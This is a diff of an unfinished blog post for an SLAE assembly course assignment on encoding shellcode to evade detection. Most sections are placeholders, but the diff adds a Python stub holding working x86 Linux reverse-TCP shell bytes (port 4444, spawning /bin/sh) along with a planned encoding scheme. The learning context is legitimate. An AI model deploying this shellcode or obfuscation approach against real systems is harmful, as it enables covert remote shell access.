@@ -63,37 +63,50 @@
                         <div class="box">
 
 													<br><h2>Contents</h2>
-													<a href="#POC" style="color:blue;">Drafting the Proof of Concept</a><br>
-													<a href="#Assembly" style="color:blue;">Writing the Assembly</a><br>
+													<a href="#Encoding" style="color:blue;">Encoding the Payload</a><br>
+													<a href="#Assembly" style="color:blue;">Writing the Decoder in Assembly</a><br>
 													<a href="#Demonstration" style="color:blue;">Demonstration</a><br>
+													<a href="#GDB" style="color:blue;">GDB Analysis</a><br>
 													<a href="#Troubleshooting" style="color:blue;">Troubleshooting</a><br>
 													<a href="#Thoughts" style="color:blue;">Thoughts and Lessons Learned</a><br><br>
 
 													<p>
 														&emsp; &emsp;This post involves writing a custom encoding scheme similar to the "insertion encoder" in SecurityTube Linux Assembler Expert (SLAE)
 														course. &nbsp;A bit of familiarity is needed before continuing. &nbsp;Encoding is used to obfuscate shellcode in order to covertly maneuver a payload.
-
-														 &nbsp;A review of the reverse TCP shell is below:<br><br>
-														From the previous <a href="https://thestunneddefense.com/pages/shell-bind-tcp.html" target="_blank" style="color:blue;">article</a>: &nbsp;
-														Reverse shells are functionally similar to bind shells but work in the opposite direction. &nbsp;Instead, the attacker machine listens
-														for incoming connections from the vicitim machine over a preconfigured port (such as 4444). &nbsp;The connection attempt is initiated by the victim
-														machine by invoking a reverse shell. &nbsp;Below is what a reverse TCP shell looks like.
+														 &nbsp;At a high level, the payload needs to be encoded, placed into a decoder, compiled, and finally executed. &nbsp;Below is what this process looks like:
+														 <!--<a href="" target="_blank" style="color:blue;">article</a> -->
 											 	</p>
-												<center><div class="image post"><img src="../images/slae/assignment2/1-reverse-shell.png" alt="" /></div></center><br>
+												<center><div class="image post"><img src="../images/slae/assignment4/1-encoding-chain.png" alt="" /></div></center><br>
+
+												<p>
+													The hardest part is deciding on an encoding scheme. &nbsp;A simple insertion encoder was demonstrated in SLAE and is therefore off limits. &nbsp;
+												</p>
 												<br>
 
 
-			<br><section id="POC"><h2>Drafting the Proof of Concept</h2></section>
+			<br><section id="Encoding"><h2>Encoding the Payload</h2></section>
 
 											<p>
-												Similar to the bind shell, a Proof of Concept (PoC) is developed using the same methodology. &nbsp;Look for the unstaged
-												version of <i>Shell Reverse TCP</i> payload in <i>msfvenom</i> and break it apart with <i>libemu's sctest</i> tool.
+												Starting at the beginning of the Proof of Concept (PoC), the <i>execve-stack</i> payload needs to be encoded. &nbsp;This can be done using high-level languages like C or Python.
+												to perform whatever operation is necessary on the bytes. &nbsp;Python will be used in this case.
 											</p>
 
 											<pre>
-												<code class="bash" style=display:block;white-space:pre-wrap>
--- snip --
+												<code class="language-python" style=display:block;white-space:pre-wrap>
+#!/usr/bin/python3
 
+# Placeholder shellcode (reverse shell).  Needs to have execve-stack shellcode
+shellcode = \
+"\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\xb1\x01\x31\xd2\xcd\x80\x89\xc7\x89\xfb\x31\xd2\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x39\xd1\x75\xf5\x31\xd2\x68\x7f\xbb\xbb\x01\x66\x89\x54\x24\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x31\xdb\x89\xfb\x31\xc0\x66\xb8\x6a\x01\x31\xd2\xb2\x10\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+# Need to decide on an encoding method. Insertion is off limits as it was done in SLAE lecture
+# split shellcode into byte array
+# for byte in shellcode byte array:
+#    run an operation on byte (i.e. multiply by \x69)
+
+
+# put byte array back together into string
+# print encoded shellcode string
 
 												</code>
 											</pre>
@@ -106,12 +119,12 @@
 
 
 
-			<br><section id="Assembly"><h2>Writing the Assembly</h2></section>
+			<br><section id="Assembly"><h2>Writing the Decoder in Assembly</h2></section>
 
 									<p>
 										&emsp; &emsp;Writing assembly
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment4/.png" alt="" /></div></center><br>
 
 
 
@@ -122,16 +135,30 @@
 									<p>
 										&emsp; &emsp;Demonstrate shellcode here
 									</p>
+									<center><div class="image post"><img src="../images/slae/assignment4/.png" alt="" /></div></center><br>
+
+
+
+			<br><section id="GDB"><h2>GDB Analysis</h2></section>
+
+									<p>
+										&emsp; &emsp;Analyze shellcode in GDB
+
+										<!--
+										* Show initial encoded payload and how it looks like gibberish.
+										* Step through decoder program in harness or compiled decoder.nasm to show how payload is slowly decoded
+										* Show final payload after decoding
+										* jump to edi!
+
+									 -->
+									</p>
 									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
-
-
-
 
 
 			<br><section id="Debugging"><h2>Debugging</h2></section>
 
 									<p>
-										&emsp; &emsp;Debugging and Troubleshooting
+										&emsp; &emsp;What problems were encountered?
 									</p>
 									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
 
